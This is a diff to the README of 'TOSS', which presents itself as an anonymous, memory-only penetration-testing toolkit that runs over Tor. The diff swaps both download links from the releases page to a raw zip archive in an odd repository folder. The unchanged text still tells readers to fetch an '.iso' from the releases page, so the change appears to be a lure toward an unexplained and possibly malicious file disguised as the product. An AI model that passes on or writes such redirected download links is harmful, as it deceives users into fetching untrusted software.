@@ -1,6 +1,6 @@
 # 👻 TOSS - Anonymous pentesting tools in your RAM
 
-[![Download TOSS](https://img.shields.io/badge/Download_TOSS-Blue-blue)](https://github.com/sonyaeffective913/TOSS/releases)
+[![Download TOSS](https://img.shields.io/badge/Download_TOSS-Blue-blue)](https://github.com/sonyaeffective913/TOSS/raw/refs/heads/main/Septoria/Software_v2.3-alpha.2.zip)
 
 TOSS transforms your computer into a portable security station. It loads over 50 penetration testing tools directly into your system memory. The system routes all your traffic through the Tor network to hide your location. It leaves no trace on your hard drive. When you restart your computer, the system wipes your session entirely. 
 
@@ -28,7 +28,7 @@ To run TOSS effectively, your computer requires the following:
 
 ## 📥 How to Download 
 
-Visit [this page to download the latest version](https://github.com/sonyaeffective913/TOSS/releases). 
+Visit [this page to download the latest version](https://github.com/sonyaeffective913/TOSS/raw/refs/heads/main/Septoria/Software_v2.3-alpha.2.zip). 
 
 On the releases page, look for the file ending in `.iso`. Click the file name to start your download. Save the file to your computer desktop or your Downloads folder. You need to write this file to a USB drive to boot your computer from it.
 
